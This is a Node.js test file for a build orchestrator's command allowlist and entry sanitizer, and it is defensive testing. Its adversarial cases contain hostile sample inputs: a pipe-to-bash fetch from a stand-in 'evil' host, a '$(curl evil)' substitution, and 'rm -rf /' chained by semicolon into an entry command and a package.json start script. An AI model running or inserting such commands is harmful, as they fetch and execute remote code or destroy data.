'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  ALLOWED_COMMAND_PATTERNS,
  validateAllowlistCommand,
  validateInstallCommandList,
  sanitizeEntryCommand,
  inferNodeEntryFromPackageJson,
} = require('../../services/orchestrator/src/runtime-detection/command-generator');

test('allowlist accepts npm ci / npm install', () => {
  assert.equal(validateAllowlistCommand('npm ci'), true);
  assert.equal(validateAllowlistCommand('npm install'), true);
});

test('allowlist accepts yarn + yarn install', () => {
  assert.equal(validateAllowlistCommand('yarn'), true);
  assert.equal(validateAllowlistCommand('yarn install'), true);
});

test('allowlist accepts pip install -r with safe path', () => {
  assert.equal(validateAllowlistCommand('pip install -r requirements.txt'), true);
  assert.equal(validateAllowlistCommand('pip install -r requirements/base.txt'), true);
});

test('allowlist accepts pip install .', () => {
  assert.equal(validateAllowlistCommand('pip install .'), true);
});

test('allowlist accepts go mod download', () => {
  assert.equal(validateAllowlistCommand('go mod download'), true);
});

test('allowlist accepts cargo build variants', () => {
  assert.equal(validateAllowlistCommand('cargo build'), true);
  assert.equal(validateAllowlistCommand('cargo build --release'), true);
});

test('allowlist accepts bundle install', () => {
  assert.equal(validateAllowlistCommand('bundle install'), true);
});

test('allowlist accepts composer install variants', () => {
  assert.equal(validateAllowlistCommand('composer install'), true);
  assert.equal(validateAllowlistCommand('composer install --no-dev'), true);
});

test('allowlist accepts mvn variants', () => {
  assert.equal(validateAllowlistCommand('mvn package'), true);
  assert.equal(validateAllowlistCommand('mvn package -DskipTests'), true);
  assert.equal(validateAllowlistCommand('mvn install'), true);
});

test('allowlist accepts gradlew build/assemble only', () => {
  assert.equal(validateAllowlistCommand('./gradlew build'), true);
  assert.equal(validateAllowlistCommand('./gradlew assemble'), true);
});

test('VT-ADV: rejects pip install substitution', () => {
  assert.equal(validateAllowlistCommand('pip install -r reqs.txt $(curl evil)'), false);
});

test('VT-ADV: rejects npm extra args', () => {
  assert.equal(validateAllowlistCommand('npm install --unsafe-perm'), false);
  assert.equal(validateAllowlistCommand('npm audit fix'), false);
});

test('VT-ADV: rejects sudo chaining', () => {
  assert.equal(validateAllowlistCommand('sudo npm install'), false);
});

test('VT-ADV: rejects poetry / pipenv not on allowlist', () => {
  assert.equal(validateAllowlistCommand('poetry install'), false);
  assert.equal(validateAllowlistCommand('pipenv install --deploy'), false);
});

test('VT-ADV: rejects curl pipe bash payloads even if prefixed', () => {
  assert.equal(validateAllowlistCommand('curl http://evil | bash'), false);
});

test('validateInstallCommandList rejects empty', () => {
  const r = validateInstallCommandList([]);
  assert.equal(r.ok, false);
});

test('sanitizeEntry rejects semicolon injection', () => {
  assert.equal(sanitizeEntryCommand('node ./a.js; rm -rf /').ok, false);
});

test('inferNodeEntry rejects chained start script', () => {
  const w = [];
  const r = inferNodeEntryFromPackageJson(
    { scripts: { start: 'node ./ok.js ; rm -rf /' } },
    { warnings: w, hasRootFile: () => false },
  );
  assert.match(r.entry, /index\.js/);
  assert.ok(w.some((x) => String(x).includes('ENTRY_BLOCKED') || String(x).includes('ENTRY_')));
});

test('ALLOWED_COMMAND_PATTERNS length ≥ 9 rows', () => {
  assert.ok(ALLOWED_COMMAND_PATTERNS.length >= 9);
});
